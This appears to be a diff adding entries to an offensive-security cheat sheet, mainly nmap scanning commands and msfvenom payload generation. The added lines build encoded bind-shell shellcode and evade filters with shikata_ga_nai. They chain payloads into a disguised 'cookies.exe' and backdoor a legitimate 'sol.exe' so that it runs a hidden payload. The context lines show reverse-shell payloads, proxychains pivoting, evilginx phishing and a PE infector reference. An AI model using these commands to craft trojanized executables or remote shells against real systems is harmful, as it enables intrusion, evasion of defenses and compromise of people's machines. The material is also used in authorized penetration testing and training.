@@ -10,6 +10,13 @@
   nmap -Pn -sA host.com --script dns-brute   # TCP ACK scan
   nmap -Pn -sW host.com --script dns-brute   # Window scan like ACK
   nmap -Pn -sI host.com zombiehost.com domain.com   # normal, idle
+  nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
+         # scan list with open UDP services
+  nmap --script=http-headers 192.168.1.0/24  # check header
+  nmap --script=http-enum 192.168.1.0/24     # find web app from known paths
+  nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24 # hearthbleed testing
+  nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24 # info
+
   shodan convert mongodbdb.json.gz csv
   shodan convert nging-sample.json.gz xlsx
   shodan count http.compenent:bootstrap
@@ -299,6 +306,9 @@ Auxiliaries - perform scanning, sniffing, wardialing, fingerprinting and securit
 Encoders - encoding the payload to go over firewalls, IDS, IPS and other similar malware defenses
 No Operation or No Operation Performed (NOP) - perform nothing  but cover a consistent payload
 
+#MSF console  - all cmds
+# https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
 msfconsole
 msf> help
 msf> show -h
@@ -384,6 +394,23 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x8
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.10.5 LPORT=443 -f exe -o met_https_reverse.exe       # gen HTTPS meterpeter payload in executable format
    # http://hackingandsecurity.blogspot.com/2018/10/metasploitable-3-without-metasploit.html
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.253.130 LPORT=8443 -f war > shell.war     # unzip shell.war
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
+     # -f format python; b - The list of characters to avoid example; - i iterate 3 times
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf
+     # -v - custom variable
+# to add some NOP
+   msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python    # before
+   msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26   # after
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python --smallest
+     # --smallest shellcode possible
+# multiple shellcode file to include
+  msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
+  msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw > messageBox2
+  msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
+     # running the cookies.exe execute both message box payloads, as well the bind shell
+msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+     # !!! -x  or -template specify an existing executable tu use as a template when you creating your payload
+     # -k  or -keep will preserve the template's normal behaviour and have your injected payload run as a separate thread
 proxychains nmap -P0 -sT -p 3389 --open -oN tcp.nmap 192.168.1.155
 proxychains rdesktop 192.168.1.155         # remove connection
 ssh -l benr -D 1080 192.168.253.143 -N -f
@@ -929,6 +956,10 @@ https://github.com/kgretzky/evilginx2
 # outlook user
 # copy plugin edit cokky extension into chrome
 # evilginx_parser.py -i /tmp/log/phish-google.log
+
+# PE Infector
+#------------------------------------------------------------------------------
+# https://www.adlice.com/chronicles-pe-infector/
 
 
 # Kubernetes
